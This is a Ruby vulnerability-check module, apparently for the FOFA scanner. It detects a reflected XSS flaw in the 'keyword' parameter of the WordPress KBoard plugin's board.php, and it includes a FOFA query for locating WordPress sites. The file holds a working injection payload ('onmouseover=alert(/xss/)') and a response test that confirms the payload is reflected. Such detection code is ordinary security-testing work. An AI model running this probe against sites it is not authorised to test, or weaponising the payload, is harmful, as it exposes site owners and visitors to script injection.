require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
    {
      "Name": "WordPress Plugin KBoard /wp-content/plugins/kboard/board.php 参数keyword XSS漏洞",
      "Description": "WordPress Plugin KBoard在页面/wp-content/plugins/kboard/board.php的GET参数keyword存在反射型XSS漏洞，可以通过闭合执行js代码。",
      "Author": "bibotaixsf@msn.cn",
      "Product": "Wordpress",
      "Homepage": "http://www.wordpress.com/",
      "DisclosureDate": "2016-09-26",
      "FofaQuery":"( body=\"content=\\\"WordPress\"$$ || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) )",
      "References":["https://www.seebug.org/vuldb/ssvid-92498"      ],
      "ScanSteps":[
        "AND",
        {
          "Request":
          {
            "method": "GET",
            "uri": "/wp-content/plugins/kboard/board.php?pageid=1&board_id=1&mod=list&target=&keyword=1\" onmouseover=alert(/xss/)\"",
          },
          "ResponseTest":
          {
            "type": "group",
            "operation": "AND",
            "checks": [
              {
                "type": "item",
                "variable": "$code",
                "operation": "==",
                "value": "200"
              },
              {
                "type": "item",
                "variable": "$body",
                "operation": "contains",
                "value": "onmouseover=alert(/xss/)\""
              }
            ]
          }
        }
      ]
    }
  end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
